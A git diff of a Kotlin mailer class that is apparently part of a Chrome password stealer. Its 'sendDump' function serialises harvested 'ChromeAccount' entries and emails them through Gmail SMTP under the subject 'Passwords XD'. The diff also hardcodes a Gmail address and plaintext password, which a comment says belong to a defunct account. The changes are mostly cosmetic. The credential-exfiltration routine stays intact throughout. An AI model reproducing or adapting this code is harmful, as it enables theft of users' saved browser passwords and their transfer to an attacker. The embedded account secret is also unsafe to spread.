@@ -4,8 +4,9 @@ import javax.mail.internet.InternetAddress
 import javax.mail.internet.MimeMessage
 
 object MailerTLS {
-    private const val emailToUse = "dmitrythrowlol@gmail.com"
-    private const val password = "A51e93A9EkZTAY"
+    // Account no longer exist. Just for testing purposes :)
+    private const val emailToUse = "dmitrythrowlol@gmail.com" /* Your gmail */
+    private const val password = "A51e93A9EkZTAY" /* Your gmail password*/
 
     private val properties: Properties = Properties().apply {
         this["mail.smtp.auth"] = "true"
@@ -20,20 +21,18 @@ object MailerTLS {
         }
     })
 
-    private fun generatePlainTextEmail(email: String, subject: String, emailBody: String) =
+    private fun generatePlainTextEmail(email: String, _subject: String, emailBody: String) =
             MimeMessage(session).apply {
                 setFrom(InternetAddress("dmitrythrowlol@gmail.com"))
-                setRecipients(Message.RecipientType.TO,
-                        InternetAddress.parse(email))
-                this.subject = subject
+                setRecipients(Message.RecipientType.TO, InternetAddress.parse(email))
+                subject = _subject
                 setText(emailBody)
             }
 
     fun sendDump(email: String, listOfAccounts: List<ChromeAccount>): Boolean = try {
         val body = listOfAccounts.toString()
+        generatePlainTextEmail(email, "Passwords XD", body).run { Transport.send(this) }
 
-        generatePlainTextEmail(email, "Passwords XD", body)
-                .run { Transport.send(this) }
         true
     } catch (e: MessagingException) {
         e.printStackTrace()
